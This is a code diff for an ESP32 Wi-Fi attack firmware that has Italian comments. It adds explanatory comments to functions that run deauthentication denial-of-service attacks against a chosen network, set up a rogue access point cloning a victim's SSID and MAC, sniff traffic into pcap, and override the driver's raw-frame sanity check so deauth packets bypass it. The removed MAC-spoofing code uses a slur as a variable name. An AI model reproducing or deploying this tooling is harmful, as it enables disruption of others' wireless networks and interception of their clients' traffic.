@@ -25,25 +25,11 @@ bool scan = true;
 
 
 
-//esp_err_t esp_wifi_set_mac(wifi_interface_t ifx, const uint8_t mac[6])
-void spoofMAC(MacAddr* pMAC ){
-    //apple 98:ca:33
-    unsigned char gay[3];
-    for(int i = 0; i <3 ;i++){
-        gay[i]= (unsigned char) rand() % 256; 
-    }
-
-
-    for(int i =0 ; i<3 ;i++){
-        (*pMAC)[3+i] = gay[i];
-    }
-        
-
-}
-
+//ritorna il valore del booleano scan 
 bool get_scan(){
     return scan;
 }
+//setta scan a true (quando si refresha la pagina viene chiamata per far partire una nuova scan)
 void set_scan(){
     scan = true;
 }
@@ -52,14 +38,13 @@ uint16_t get_AP_num(){
     return AP_num;
 }
 
+//ritorna la lista degli AP (viene chiamata per attaccare e per visualizzarla nel web server)
 wifi_ap_record_t* getAPrecords(){
 
     return apRecords;
 }
-//esp_err_t esp_wifi_scan_start(const wifi_scan_config_t *config, bool block)
-//esp_err_t esp_wifi_scan_stop(void)
-//esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records)
 
+//attacca il SSID specificato con un attacco DoS di tipo Deauth
 void attack_ssid(char* ssid){
 
     for(uint8_t n = 0; n < AP_num; n++){
@@ -79,10 +64,15 @@ void attack_ssid(char* ssid){
             }
         }
     }
+    //risetta il wifi controller dopo l' attacco per continure ad utilizzare il webserver
+    //(si usa perche' attack_method_rogueap cambia il controller wifi)
     wifictl_mgmt_ap_start();
     wifictl_restore_ap_mac();   
 }
 
+
+//fa una ricerca di tutti gli Access Point rilevabili dall' ESP
+//e li salva in nella lista globale di apRecords
 void scanWifi(){
     
     ESP_LOGI(TASK_NAME, "entrato nella funzione SCANWIFI");
@@ -123,10 +113,15 @@ void scanWifi(){
     }
 }
 
+
+//sovrascrive la funzione (non documentata) della libreria ufficiale
+//la usiamo cosi' possiamo mandare pacchetti di tipo deauth senza controlli
 int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-  return 0; //LA FUNZIONE IMPEDISCE DI MANDARE PACCHETTI "STRANI"
+  return 0;
 }
 
+
+//manda pacchetti di tipo deauth utilizzando una funzione per mandare raw packets
 void deauth_task(MacAddr bssid, uint8_t prim_chan) {
 
     
@@ -149,6 +144,7 @@ void deauth_task(MacAddr bssid, uint8_t prim_chan) {
 
 }
 
+
 uint8_t strlen_uint8(uint8_t *str){
     uint8_t i = 0;
     while(str[i] != '\0'){
@@ -157,6 +153,8 @@ uint8_t strlen_uint8(uint8_t *str){
     return i;
 }
 
+//fa un attacco DoS copiando le informazioni (SSID MAC) cosi' che i client della vittima
+//si connettono al nostro AP invece dell' AP originale e verranno deautenticati
 void attack_method_rogueap(wifi_ap_record_t *ap_record){
     ESP_LOGD(TASK_NAME, "Configuring Rogue AP");
     //ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
@@ -172,7 +170,7 @@ void attack_method_rogueap(wifi_ap_record_t *ap_record){
 }
 
 
-
+//inizializza il pcap_serializer e inizializza 1 thread per sniffare il traffico e 1 task per fare scanWifi()
 void wardriver_init(void) {
     srand(time(NULL));
     pcap_serializer_init();
